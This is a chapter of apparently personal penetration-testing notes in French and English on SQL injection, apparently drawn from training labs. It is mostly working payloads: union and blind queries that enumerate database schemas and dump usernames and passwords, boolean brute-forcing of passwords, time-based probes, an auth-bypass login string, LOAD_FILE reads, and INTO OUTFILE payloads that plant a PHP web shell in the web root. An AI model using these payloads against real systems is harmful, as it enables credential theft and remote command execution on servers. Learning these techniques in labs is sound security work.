\chapter{SQL Injection}
\section{SQL injection}
\begin{itemize}
\item \url{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass}
\item \url{https://portswigger.net/web-security/sql-injection/blind}
\item \url{https://portswigger.net/web-security/sql-injection/union-attacks}
\item \url{https://portswigger.net/web-security/sql-injection/examining-the-database}
\item \url{https://portswigger.net/web-security/sql-injection/cheat-sheet}
\item \url{https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/}
\item \url{https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet}
\end{itemize}


\subsection{Encoding}


\begin{tabular}{|l|l|}
Payload & URL Encoded \\
 ' & \% 27 \\
 " & \% 22 \\
 \# & \% 23 \\
 ; & \% 3B \\
 ) & \% 29 \\
 \end{tabular}

\subsection{In-Band SQL Injection}
union-based injection
utile sur un get qui retourne un seul enregistrement


\textbf{Step 1}: Location of Injection
rechercher un retour empty

\textbf{Step 2}: Detect number of columns

\begin{verbatim}
Using ORDER BY (order by 1, order by 2-- ...)
Using UNION (union select 1 -- union select 1,2i -- ...)
\end{verbatim}


Savoir combien d'éléments sont retournés par le select en essayer successivement “union 1,..." jusqu'a ce qu'il n'y ai plus d'erreur

Location of Injection
rechercher les champ de la requete qui s'affichent et y placer le payload


\begin{verbatim}
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
\end{verbatim}



\subsection{Error based SQL injection}
\subsection{Blind SQL injection}

\subsubsection{Boolean based}
Enumeration technic for true/false API such as 
\verb+https://website.thm/checkuser?username=admin+

behind such API there is a SQL request of type 

\begin{verbatim}
select * from users where username = '%username%' LIMIT 1;
\end{verbatim}

\textbf{Step 1}: look for a parameter value that will produce an empty record
set and therefore a  false result to the request
execution

\textbf{Step 2}: Detect number of columns
\begin{verbatim}
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1, 2;--
...
\end{verbatim}

\textbf{Step 3} Enumérate

\begin{verbatim}
admin123' UNION SELECT 1,2,3 where database() like '%';--
dmin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
admin123' UNION SELECT 1,2,3 where database() like 'sql_three%';--
...
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
...
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
\end{verbatim}

Par contre quand on trouve un champ  il faut l'exclure pour pouvoir continuer a énumérer  les champs
\begin{verbatim}
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

\end{verbatim}
maintenant on a la structure de la table.
on cherhce un utilisateur qui existe 
\verb+ admin123' UNION SELECT 1,2,3 from users where username like 'a%+
puis bruteforce du password 
\verb+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%+

\subsubsection{Time based Injection}
A  time-based blind SQL Injection is very similar to the above Boolean  based, in that the same requests are sent, but there is no visual  indicator of your queries being wrong or right this time. Instead, your  indicator of a correct query is based on the time the query takes to  complete. This time delay is introduced by using built-in methods such  as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

field enumération

\begin{verbatim}
admin123' UNION SELECT SLEEP(5);--
\end{verbatim}
si prend 5 sec c'est que c'est bon

\begin{verbatim}
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
\end{verbatim}

\subsection{Redaing/writting files}

\subsubsection{MySQL}


Privileges


\begin{verbatim}
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

SELECT super_priv FROM mysql.user
SELECT sql_grants FROM information_schema.sql_show_grants
SELECT grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

; -----> FILE
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
; false -----> INTO OUTFILE
\end{verbatim}

\begin{verbatim}
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
' union select 1,LOAD_FILE("/var/www/flag.txt"),3,4-- -

' union select "", '<?php system("pwd"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -

final assessment
login:  ‘ or ’1'='1';--
password : a
' union select "", '<?php system("pwd"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -
' union select "", '<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
' union select 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -

' union select 1,2,3,4,5-- -

'%20union%20select%201,2,3,4,5--%20-
\end{verbatim}



\subsubsection{Postgres}
http://shuber.io/reading-from-the-filesystem-with-postgres/

\begin{verbatim}
select pg_ls_dir

pg_read_file
\end{verbatim}

